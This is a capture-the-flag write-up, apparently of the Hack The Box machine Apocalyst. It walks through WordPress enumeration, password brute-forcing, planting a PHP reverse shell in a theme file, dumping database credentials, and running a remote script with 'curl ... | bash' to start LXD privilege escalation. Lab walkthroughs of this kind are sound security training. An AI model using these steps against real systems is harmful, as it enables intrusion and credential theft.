@@ -1,0 +1,760 @@
+I"E�<h1 id="enumeration">Enumeration</h1>
+<h2 id="masscan--nmap">Masscan + Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
+Discovered open port 80/tcp on 10.10.10.46                                     
+Discovered open port 22/tcp on 10.10.10.46                                     
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Parse those ports to nmap:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
+<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
+
+<span class="c"># Nmap 7.91 scan initiated Fri Jul 23 02:48:51 2021 as: nmap -sVC --min-rate 1000 -p 80,22 -oN nmap-fullscan.out 10.10.10.46</span>
+Nmap scan report <span class="k">for </span>10.10.10.46
+Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apocalypse Preparation Blog
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Jul 23 02:49:04 2021 -- 1 IP address (1 host up) scanned in 12.97 seconds</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="http">HTTP</h2>
+<p>Directory brute-forcing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://<span class="sb">`</span>IP<span class="sb">`</span>/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.zip,.html,.php,.bak <span class="nt">-fc</span> 401,403,405 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'Words: 20'</span>
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.46/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Extensions       : .txt .zip .html .php .bak
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 401,403,405
+________________________________________________
+
+index.bak               [Status: 200, Size: 148, Words: 36, Lines: 9]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
+wp-login.php            [Status: 200, Size: 2460, Words: 153, Lines: 70]
+.                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+readme.html             [Status: 200, Size: 7413, Words: 760, Lines: 99]
+wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
+license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386]
+wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-blog-header.php      [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-links-opml.php       [Status: 200, Size: 235, Words: 14, Lines: 11]
+wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1]
+wp-activate.php         [Status: 302, Size: 0, Words: 1, Lines: 1]
+:: Progress: [378522/378522] :: Job [1/1] :: 430 req/sec :: Duration: [0:14:47] :: Errors: 0 ::
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>It also showed a lot of endpoints which linked to same pic.</p>
+
+<p>I see wordpress so I ran wpscan:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://<span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-e</span> ap,t,tt,u
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.11
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[+] URL: http://10.10.10.46/ [10.10.10.46] default: [N]
+[+] Started: Fri Jul 23 02:51:17 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.10.46/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://10.10.10.46/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.10.46/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.10.46/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.10.46/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>4.8<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.10.46/, Match: '</span>WordPress 4.8<span class="s1">'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:09 &lt;================================================&gt; (400 / 400) 100.00% Time: 00:00:09
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] Theme(s) Identified:
+
+[+] twentyfifteen
+ | Location: http://10.10.10.46/wp-content/themes/twentyfifteen/
+ | Last Updated: 2021-03-09T00:00:00.000Z
+ | Readme: http://10.10.10.46/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://10.10.10.46/wp-content/themes/twentyfifteen/style.css
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen'</span>s simple, st...
+
+<span class="o">[</span>+] Enumerating Timthumbs <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Checking Known Locations - Time: 00:00:58 &lt;<span class="o">==============================================&gt;</span> <span class="o">(</span>2568 / 2568<span class="o">)</span> 100.00% Time: 00:00:58
+
+<span class="o">[</span>i] No Timthumbs Found.
+
+<span class="o">[</span>+] Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;<span class="o">==================================================&gt;</span> <span class="o">(</span>10 / 10<span class="o">)</span> 100.00% Time: 00:00:00
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] falaraki
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+<span class="o">[!]</span> You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+<span class="o">[</span>+] Finished: Fri Jul 23 02:52:38 2021
+<span class="o">[</span>+] Requests Done: 3032
+<span class="o">[</span>+] Cached Requests: 10
+<span class="o">[</span>+] Data Sent: 829.915 KB
+<span class="o">[</span>+] Data Received: 920.947 KB
+<span class="o">[</span>+] Memory used: 230.48 MB
+<span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:01:20
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Got one username: <code class="language-plaintext highlighter-rouge">falaraki</code>.</p>
+
+<p>I made a wordlist with <code class="language-plaintext highlighter-rouge">cewl</code> for the / directory as it had some content. Fired it to wp-login.php with wpscan, but it didn’t work.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>cewl <span class="nt">--with-numbers</span> http://apocalyst.htb  <span class="o">&gt;</span> cewl-wordlist
+<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://<span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-U</span> falaraki <span class="nt">-P</span> ./cewl-wordlist <span class="nt">--password-attack</span> wp-login
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+<p>Ran ffuf with that new-wordlist:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://apocalyst.htb/FUZZ/ <span class="nt">-w</span> ./cewl-wordlist <span class="nt">-fw</span> 14 <span class="nt">-s</span>
+Rightiousness
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>That contains a word <code class="language-plaintext highlighter-rouge">needle</code>.
+Visiting /needle doesn’t lead anywhere.</p>
+
+<p>I downloaded the image, ran exiftool on it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wget http://10.10.10.46/Rightiousness/image.jpg
+<span class="nv">$ </span>exiftool image.jpg
+ExifTool Version Number         : 12.12
+File Name                       : image.jpg
+Directory                       : <span class="nb">.</span>
+File Size                       : 210 KiB
+File Modification Date/Time     : 2017:07:27 15:38:34+05:30
+File Access Date/Time           : 2021:07:23 16:11:41+05:30
+File Inode Change Date/Time     : 2021:07:23 16:11:41+05:30
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Image Width                     : 1920
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span class="o">(</span>2 2<span class="o">)</span>
+Image Size                      : 1920x1080
+Megapixels                      : 2.1
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">strings</code> even didn’t lead anywhere.
+Ran <code class="language-plaintext highlighter-rouge">steghide</code> with no password:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>steghide extract <span class="nt">-sf</span> image.jpg
+Enter passphrase:
+wrote extracted data to <span class="s2">"list.txt"</span><span class="nb">.</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Trying <code class="language-plaintext highlighter-rouge">falaraki:needle</code> for wp-login didn’t work.
+Let’s try with that <code class="language-plaintext highlighter-rouge">list.txt</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://<span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-U</span> falaraki <span class="nt">-P</span> ./list.txt <span class="nt">--password-attack</span> wp-login
+
+<span class="o">[</span>+] Performing password attack on Wp Login against 1 user/s
+<span class="o">[</span>SUCCESS] - falaraki / Transclisiation
+Trying falaraki / total Time: 00:00:22 &lt;<span class="o">==============================================</span>                                                                      <span class="o">&gt;</span> <span class="o">(</span>335 / 821<span class="o">)</span> 40.80%  ETA: ??:??:??
+
+<span class="o">[!]</span> Valid Combinations Found:
+ | Username: falaraki, Password: Transclisiation
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">falaraki:Transclisiation</code> it is.</p>
+
+<p>After logging in:</p>
+<ul>
+  <li>I go to Themes, twentyseventeen is the one active.</li>
+  <li>Go to editor, edit <code class="language-plaintext highlighter-rouge">index.php</code> put my php-reverse shell.</li>
+  <li>Load http://10.10.10.46/ and got a shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.46 53356
+Linux apocalyst 4.4.0-62-generic <span class="c">#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 11:50:56 up 13:35,  0 <span class="nb">users</span>,  load average: 0.00, 0.04, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1406<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@apocalyst:/<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Getting content in <code class="language-plaintext highlighter-rouge">wp-config.php</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>www-data@apocalyst:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/apocalyst.htb/wp-config.php
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wp_myblog'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'Th3SoopaD00paPa5S!'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Dumping MySQL database:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mysql <span class="nt">-uroot</span> <span class="nt">-D</span> wp_myblog <span class="nt">-p</span> <span class="nt">-e</span> <span class="s1">'select user_login,user_pass from wp_users;'</span>
+
+user_login      user_pass
+falaraki        <span class="nv">$P$BnK</span>/Jm451thx39mQg0AFXywQWZ.e6Z.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>But the hash didn’t crack:
+With john:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 256/256 AVX2 8x3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+0g 0:00:00:14 100.0% <span class="o">(</span>ETA: 16:43:10<span class="o">)</span> 0g/s 27933p/s 27933c/s 27933C/s mendoan..meganscott
+Session aborted
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>or you can try hashcat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-m</span> 400 <span class="nb">hash</span> ./rockyou.txt
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: phpass, WordPress <span class="o">(</span>MD5<span class="o">)</span>, phpBB3 <span class="o">(</span>MD5<span class="o">)</span>, Joomla <span class="o">(</span>MD5<span class="o">)</span>
+Hash.Target......: <span class="nv">$P$BnK</span>/Jm451thx39mQg0AFXywQWZ.e6Z.
+Time.Started.....: Fri Jul 23 16:35:07 2021 <span class="o">(</span>35 secs<span class="o">)</span>
+Time.Estimated...: Fri Jul 23 16:35:42 2021 <span class="o">(</span>0 secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>./rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#3.........:   413.7 kH/s <span class="o">(</span>6.84ms<span class="o">)</span> @ Accel:256 Loops:256 Thr:64 Vec:1
+Recovered........: 0/1 <span class="o">(</span>0.00%<span class="o">)</span> Digests, 0/1 <span class="o">(</span>0.00%<span class="o">)</span> Salts
+Progress.........: 14344391/14344391 <span class="o">(</span>100.00%<span class="o">)</span>
+Rejected.........: 0/14344391 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 14344391/14344391 <span class="o">(</span>100.00%<span class="o">)</span>
+Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:7936-8192
+Candidates.#3....: <span class="nv">$HEX</span><span class="o">[</span>303130303637323235] -&gt; <span class="nv">$HEX</span><span class="o">[</span>042a0337c2a156616d6f732103]
+Hardware.Mon.#3..: Temp: 77c Util: 94% Core:1695MHz Mem:3504MHz Bus:16
+
+Started: Fri Jul 23 16:35:03 2021
+Stopped: Fri Jul 23 16:35:44 2021
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I see, I can already the user flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>www-data@apocalyst:/home/falaraki<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nt">-rw-------</span> 1 falaraki falaraki  534 Jul 23 12:09 .bash_history
+<span class="nt">-rw-r--r--</span> 1 falaraki falaraki  220 Jul 26  2017 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 falaraki falaraki 3771 Jul 26  2017 .bashrc
+drwx------ 2 falaraki falaraki 4096 Jul 26  2017 .cache
+drwxrwxr-x 2 falaraki falaraki 4096 Jul 26  2017 .nano
+<span class="nt">-rw-r--r--</span> 1 falaraki falaraki  655 Jul 26  2017 .profile
+<span class="nt">-rw-rw-r--</span> 1 falaraki falaraki  109 Jul 26  2017 .secret
+<span class="nt">-rw-r--r--</span> 1 falaraki falaraki    0 Jul 26  2017 .sudo_as_admin_successful
+<span class="nt">-rw-r--r--</span> 1 root     root     1024 Jul 27  2017 .wp-config.php.swp
+<span class="nt">-rw-rw-r--</span> 1 falaraki falaraki   33 Jul 26  2017 user.txt
+www-data@apocalyst:/home/falaraki<span class="nv">$ </span><span class="nb">cat </span>user.txt
+9182d4d0b3f40307d86673193a9cd4e5
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Also I’ve some file named .secret, which seems to have some base64 encoded data:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>www-data@apocalyst:/home/falaraki<span class="nv">$ </span><span class="nb">cat</span> .secret | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>Keep forgetting password so this will keep it safe!
+Y0uAINtG37TiNgTH!sUzersP4ss
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>www-data@apocalyst:/home/falaraki<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@apocalyst:/home/falaraki<span class="nv">$ </span>su falaraki
+Y0uAINtG37TiNgTH!sUzersP4ss
+
+falaraki@apocalyst:~<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="privesc">Privesc</h1>
+<p>Running <code class="language-plaintext highlighter-rouge">linpeas</code> shows me falaraki is in lxd group and <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is writable:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>falaraki@apocalyst:~<span class="nv">$ </span>curl http://10.10.14.9/peas/linpeas.sh | bash
+
+<span class="o">[</span>+] Permissions <span class="k">in </span>init, init.d, systemd, and rc.d
+<span class="o">[</span>+] Hashes inside passwd file? ........... No
+<span class="o">[</span>+] Writable passwd file? ................ /etc/passwd is writable
+<span class="o">[</span>+] Credentials <span class="k">in </span>fstab/mtab? ........... No
+0mNoCan I <span class="nb">read </span>shadow files? .............
+<span class="o">[</span>+] Can I <span class="nb">read </span>opasswd file? ............. No
+<span class="o">[</span>+] Can I write <span class="k">in </span>network-scripts? ...... No
+<span class="o">[</span>+] Can I <span class="nb">read </span>root folder? .............. No
+
+<span class="o">[</span>+] My user
+<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>falaraki<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>falaraki<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>falaraki<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="method-1-lxd-container-on-root-path">Method 1: LXD container on root path</h3>
+<p>Created alpine lxc image locally and transferred to apocalyst.htb</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="c">#Install requirements</span>
+<span class="nb">sudo </span>apt update
+<span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> golang-go debootstrap rsync gpg squashfs-tools
+<span class="c">#Clone repo</span>
+<span class="nb">sudo </span>go get <span class="nt">-d</span> <span class="nt">-v</span> github.com/lxc/distrobuilder
+<span class="c">#Make distrobuilder</span>
+<span class="nb">cd</span> <span class="nv">$HOME</span>/go/src/github.com/lxc/distrobuilder
+make
+<span class="c">#Prepare the creation of alpine</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="nv">$HOME</span>/ContainerImages/alpine/
+<span class="nb">cd</span> <span class="nv">$HOME</span>/ContainerImages/alpine/
